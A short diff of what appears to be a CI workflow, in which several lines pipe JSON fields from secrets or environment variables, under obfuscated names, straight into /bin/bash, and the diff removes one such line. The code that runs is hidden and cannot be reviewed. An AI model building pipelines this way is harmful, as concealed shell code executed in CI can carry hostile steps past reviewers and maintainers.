@@ -20,7 +20,6 @@ jobs:
           jusm3: ${{ secrets.jusm3 }}
         run: |
           printf '%s' "$jusm3" | jq -r .yl121 | /bin/bash
-          printf '%s' "$cwdfg83" | jq -r .wt9538 | /bin/bash
           printf '%s' "$zgl1" | jq -r .ac88 | /bin/bash
           echo $izfqz7959 | jq -r .soaiz93 | /bin/bash
           echo $yqsel637 | jq -r .hb97 | /bin/bash
